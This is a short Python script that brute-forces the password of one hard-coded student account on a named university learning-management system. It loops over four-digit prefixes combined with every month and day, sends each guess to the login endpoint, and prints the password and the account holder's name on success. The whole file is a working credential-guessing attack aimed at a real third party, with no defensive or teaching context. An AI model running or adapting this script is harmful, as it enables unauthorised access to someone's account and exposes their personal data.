import urllib
import json
from time import sleep

url_base = "http://lms.nthu.edu.tw/sys/lib/ajax/login_submit.php"
account = "106061702"
start_month = 1


def login(password):
    url = url_base + "?account=" + account + "&password=" + password
    response = urllib.urlopen(url)
    data = json.loads(response.read())
    status = data["ret"]["status"]
    if(status != "false"):
        print password
        print data["ret"]["name"]


for month in range(start_month, 13):
    for day in range(1, 32):
        print "Trying", month, day
        for i in range(10000):
            password = str(i).zfill(4) + str(month).zfill(2) + str(day).zfill(2)
            login(password)
            sleep(0.1)
